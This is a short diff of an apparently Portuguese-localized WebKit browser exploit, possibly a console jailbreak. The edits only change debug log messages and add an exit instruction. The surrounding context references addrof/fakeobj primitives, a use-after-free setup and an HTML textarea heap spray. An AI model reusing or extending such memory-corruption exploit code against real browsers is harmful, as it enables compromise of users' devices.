@@ -121,9 +121,11 @@ function setupRW() {
 	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
 		die("[!] Failed to setup addrof/fakeobj primitives");
 	debug_log("[+] Succesfully got addrof/fakeobj");
-	debug_log("------------------------------------------------------");
-	debug_log("FIM DO WEBKIT...");
-	debug_log("------------------------------------------------------");
+	debug_log("---------------------------------------------------------------------");
+	debug_log("FIM DO WEBKIT");
+	debug_log("---------------------------------------------------------------------");
+	debug_log("");
+	debug_log("ATENÇÃO! Para sair, pressione o botão \"OPTION\" e selecione \"Fechar janela\".");
 
 	/* Getting code execution */
 	/* ... */
@@ -478,9 +480,9 @@ function prepareUAF() {
 
 /* HTMLElement spray */
 function sprayHTMLTextArea() {
-	debug_log("------------------------------------------------------");
+	debug_log("---------------------------------------------------------------------");
 	debug_log("INICIANDO O WEBKIT...");
-	debug_log("------------------------------------------------------");
+	debug_log("---------------------------------------------------------------------");
 	debug_log("[+] Pulverizando elemento de área de texto HTML ...");
 
 	let textarea_div_elem = document.createElement("div");
